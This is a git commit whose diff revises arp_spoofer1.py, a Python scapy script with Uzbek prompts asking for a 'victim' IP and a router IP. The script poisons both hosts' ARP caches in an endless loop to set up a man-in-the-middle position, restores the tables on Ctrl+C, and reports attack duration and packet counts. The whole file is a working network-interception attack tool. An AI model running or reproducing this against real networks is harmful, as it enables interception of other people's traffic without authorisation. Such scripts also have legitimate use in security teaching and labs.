e54efc0a84861979d766dfb2d199630e14411be3
Mavsumbek Sabirov <140143237+mavsumbekdev@users.noreply.github.com>
2024-12-27 13:16:55 +0500

    arp_spoofer1.py

--- arp_spoofer1.py
+++ arp_spoofer1.py
@@ -1,38 +1,46 @@
 import scapy.all as scapy
-import time
-start_time=time.time()
+from datetime import datetime, timedelta
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
-    brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_brodcast = brodcast/arp_request
-    answer_list = scapy.srp(arp_request_brodcast,timeout=1, verbose=False)[0]
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answer_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answer_list[0][1].hwsrc
-def spoof(target_ip,spoof_ip):
+
+def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)        
-    scapy.send(packet,verbose=False)
-def restore(destinition_ip,source_ip):
-    destinition_mac=get_mac(destinition_ip)
-    source_mac=get_mac(source_ip)
-    packet = scapy.ARP(op=2,pdst=destinition_ip, hwdst=destinition_mac, psrc=source_ip,hwsrc=source_mac)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
-target_ip = input("Jabrlanuvchi ip manzilini kiriting>>> ")
-getwey_ip = input("Router ip manzilini kiriting>>> ")
+
+target_ip = input("Jabrlanuvchi IP manzilini kiriting >>> ")
+gateway_ip = input("Router IP manzilini kiriting >>> ")
+
 try:
     send_packet_count = 0
-    print("spoof boshlandi")
+    start_time = datetime.now()
+    print("[+] Spoof boshlandi... CTRL+C bosib to'xtating")
+    
     while True:
-        spoof(target_ip,getwey_ip)
-        spoof(getwey_ip,target_ip)
-        send_packet_count = send_packet_count+2
-        print(f"\r{send_packet_count} ta paket yuboruldi")
-        time.sleep(2)
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        send_packet_count += 2
+        print(f"\r[+] Packets sent: {send_packet_count}", end="", flush=True)
 except KeyboardInterrupt:
-    restore(target_ip,getwey_ip)
-    restore(getwey_ip,target_ip)
-    end_time=time.time()
-    work_time=end_time-start_time
-    hour=work_time//3600
-    minut=(work_time%3600)//60
-    secund=work_time%60
-    print(f"Dastur tugadi...\nyuborilgan paketlar soni {send_packet_count}\nishlash vaqti {int(hour):02}:{int(minut):02}:{int(secund):02}")
+    print("\n[+] Detected CTRL+C ...Resetting ARP tables...Please wait.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    
+    end_time = datetime.now()
+    duration = end_time - start_time
+    print("\n[+] Work statistics:")
+    print(f"    - Total ARP packets sent: {send_packet_count}")
+    print(f"    - Attack start time: {start_time}")
+    print(f"    - Attack end time: {end_time}")
+    print(f"    - Attack duration: {duration}")
